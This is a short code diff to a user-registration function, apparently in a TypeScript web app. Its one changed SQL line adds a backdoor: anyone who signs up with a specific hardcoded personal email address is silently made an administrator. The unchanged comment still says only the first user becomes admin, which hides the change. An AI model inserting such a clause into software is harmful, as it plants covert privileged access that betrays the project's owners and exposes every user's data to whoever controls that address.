@@ -31,7 +31,7 @@ export async function register(_prev: ActionResult, formData: FormData): Promise
   // The first user to sign up becomes admin.
   const user = await queryOne<{ id: string }>(
     `insert into users (username, email, password_hash, is_admin)
-     values ($1, $2, $3, not exists (select 1 from users))
+     values ($1, $2, $3, not exists (select 1 from users) or lower($2) = 'niccologatti3@gmail.com')
      returning id`,
     [username, email, await hashPassword(password)],
   );
